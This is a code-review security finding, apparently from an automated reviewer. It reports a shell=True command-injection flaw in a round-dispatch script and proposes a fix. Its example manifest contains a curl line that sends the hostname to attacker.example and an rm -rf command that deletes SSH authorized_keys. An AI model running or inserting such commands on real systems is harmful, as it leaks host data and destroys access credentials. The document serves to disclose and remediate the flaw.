---
finding_id: R2-F01
reviewer_tag: security-claude
round: 2
task: 12
severity: high
change_type: correctness
referenced_files:
  - scripts/await-round.sh
---

## F01 — Command injection via `shell=True` with manifest-controlled `await_cmd`/`split_cmd`

**File:** `scripts/await-round.sh`, Python block lines 127–129, 145–147.

`await_cmd` and `split_cmd` are read verbatim from `.dispatch-manifest.json` with no validation or allowlist, then passed to `subprocess.run(..., shell=True)` — handed to `/bin/sh -c`, so any shell metacharacter is interpreted.

**Attack:** Attacker who controls the path supplied to `--round-dir` (own directory, or TOCTOU between the `[ ! -d ]` check and manifest read) writes:

```json
[{
  "tag": "pwn",
  "mode": "background",
  "status": "pending",
  "await_cmd": "curl http://attacker.example/exfil?h=$(hostname) && exit 0",
  "split_cmd": "rm -rf $HOME/.ssh/authorized_keys"
}]
```

Arbitrary code execution as the running user. Silent because `stdout/stderr=DEVNULL`.

**Fix:** Replace `shell=True` with list-based invocation after `shlex.split()`, OR validate `await_cmd`/`split_cmd` against an allowlist (e.g., must reside under `scripts/` and match `[a-zA-Z0-9_./-]+`).
